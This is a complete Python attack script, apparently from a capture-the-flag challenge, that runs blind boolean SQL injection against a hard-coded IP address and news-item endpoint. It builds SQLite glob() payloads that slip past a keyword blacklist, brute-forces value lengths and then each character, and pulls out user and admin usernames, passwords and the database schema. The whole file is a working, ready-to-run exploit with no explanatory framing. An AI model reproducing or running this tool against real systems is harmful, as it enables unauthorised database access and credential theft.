#!/usr/bin/python3
# -*- coding: utf-8 -*-

import sys
if sys.version_info.major<3:
    print("Python3 required")
    sys.exit(0)

import urllib.parse
import requests
from time import sleep

#SETTINGS
string_true = 'es posible'
string_false = None
string_error = 'Blacklisted'

code_true = 200
code_false = None
code_error = None

def execute(payload):
    url = 'http://91.134.238.252:57007/news/item?id=2'
    user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240'
    cookies = 'JSESSIONID=s%3ATnBhLlVCiHIcgAnDAlPK-HtLWCfM_BW5.Lv%2FIpqh8o3gKiV5B%2FreUaD8cXZkrPaPQW%2FL3oVgyU8I'
    headers = { 'User-Agent' : user_agent, 'Connection': 'keep-alive'}
    headers['Cookie'] = cookies

    url = url + urllib.parse.quote(payload)
    #print(url) #DEBUG

    while True:
        try:
            r = requests.get(url, headers=headers)
            data = r.text
            code = r.status_code
            #print("%s %s %s" % (payload, code, data)) #DEBUG
        except KeyboardInterrupt:
            sys.exit()
        except:
            print(payload)
            print("\n[-] Request Error! ")
            try:
                sleep(1)
            except KeyboardInterrupt:
                sys.exit()
            continue
        break

    return (data, code)


def get(table, col, where = None, lengths = []):

    #sacar tamaños
    if len(lengths)==0:
        for i in range(1,150):

            if where:
                (where1, where2) = where.split('=')
                payload = "'and(SELECT(1)from("+table+")WHERE(glob('"+where2+"',"+where1+")and(glob('" + '?'*i + "',"+col+"))))and'1"
            else:
                payload = "'and(SELECT(1)from("+table+")WHERE((glob('" + '?'*i + "',"+col+"))))and'1"
            (data,code) = execute(payload)
            #print(data,code)

            # TRUE
            if (string_true is not None and string_true in data) or (code_true is not None and code_true==code):
                length = i
                lengths.append(i)
                sys.stdout.write('+')
                sys.stdout.flush()
                pass

            # FALSE
            elif (string_false is not None and string_false in data) or (code_false is not None and code_false==code):
                sys.stdout.write('.')
                sys.stdout.flush()
                pass

            # ERROR
            elif (string_error is not None and string_error in data) or (code_error is not None and code_error==code):
                sys.stdout.write('-')
                sys.stdout.flush()
                pass

            else:
                sys.stdout.write('.')
                sys.stdout.flush()
                pass

    print("------------\nlengths found %s\n------------" % lengths)

    for length in lengths:
        word = ''
        for i in range(len(word), length):

            for letter in '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-?': #ASCII

                if where:
                    (where1, where2) = where.split('=')
                    payload = "'and(SELECT(1)from("+table+")WHERE(glob('"+where2+"',"+where1+")and(glob('" + word + letter + '?'*(length-len(word)-1) + "',"+col+"))))and'1"
                else:
                    payload = "'and(SELECT(1)from("+table+")WHERE((glob('" + word + letter + '?'*(length-len(word)-1) + "',"+col+"))))and'1"

                (data,code) = execute(payload)

                # TRUE
                if (string_true is not None and string_true in data) or (code_true is not None and code_true==code):
                    sys.stdout.write(letter)
                    sys.stdout.flush()
                    word = word + letter
                    break

                # FALSE
                elif (string_false is not None and string_false in data) or (code_false is not None and code_false==code):
                    pass

                # ERROR
                elif (string_error is not None and string_error in data) or (code_error is not None and code_error==code):
                    pass

                else:
                    pass
            else:
                print("Not found")
                break

        print("\n------------\nFound: %s\n------------" % word)


def main():
    get('users','user')
    get('users','pass')
    get('sqlite_master', 'tbl_name', None, [4, 5, 6, 15]) # news, users, admins
    get('sqlite_master', 'sql', 'tbl_name=admins')
    get('admins', 'u53rn4m333')
    get('admins', 'p455w0rddd')

if __name__ == "__main__":
    main()
